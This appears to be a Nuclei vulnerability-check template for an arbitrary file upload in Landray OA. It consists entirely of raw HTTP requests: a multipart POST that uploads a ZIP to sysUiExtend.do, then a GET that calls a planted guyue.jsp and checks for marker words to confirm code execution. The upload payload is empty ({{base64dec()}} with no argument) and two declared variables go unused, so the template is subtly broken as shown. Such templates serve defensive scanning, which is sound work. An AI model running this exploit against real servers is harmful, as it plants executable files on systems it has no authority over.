id: landary-oa-sysUiExtend-fileupload

info:
  name: 蓝凌OA sysUiExtend 任意文件上传
  author: SleepingBag945
  severity: critical
  reference:
    - https://mp.weixin.qq.com/s/DorHJncR89z9XvyTwalnFA
  tags: landray,oa,treexml,rce,vuln

variables:
  boundary: "{{to_lower(rand_base(20))}}"
  filename: "{{to_lower(rand_base(20))}}"

http:
  - raw:
      - |
        POST /api///sys/ui/sys_ui_extend/sysUiExtend.do?method=getThemeInfo HTTP/1.1
        Host: {{Hostname}}
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
        Content-Type: multipart/form-data; boundary=---------------------------260140030128010173621878123124
        Accept: application/json, text/javascript, */*; q=0.01
        X-Requested-With: XMLHttpRequest

        -----------------------------260140030128010173621878123124
        Content-Disposition: form-data; name="file"; filename="guyue.zip"
        Content-Type: application/x-zip-compressed

        {{base64dec()}}
        -----------------------------260140030128010173621878123124--
        

      - |
        GET /resource/ui-ext/guyue/guyue.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36

    matchers-condition: and
    matchers:
      - type: word
        part: body_2
        words:
          - "hello"
          - "hacker"
          - "guyue"
        condition: and